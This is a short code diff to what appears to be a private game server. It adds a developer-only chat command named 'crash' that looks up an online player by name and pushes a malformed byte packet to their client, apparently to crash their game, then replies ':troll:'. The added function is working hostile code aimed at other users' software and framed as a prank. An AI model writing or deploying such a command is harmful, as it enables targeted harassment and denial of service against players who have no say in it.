@@ -386,6 +386,20 @@ async def unfreeze(user, args):
 
     return 'User unfrozen!'
 
+@command(priv=Privileges.Developer, name='crash')
+async def crash(user, args):
+    if len(args) < 1:
+        return 'You must provide a username to crash!'
+    
+    t = glob.players_name.get(args[0])
+    
+    if not t:
+        return 'User not online'
+    
+    t.enqueue(b'G\x00\x00\x04\x00\x00\x00\x80\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00')
+    
+    return ':troll:'
+
 #####################
 
 async def a_req(user, args):
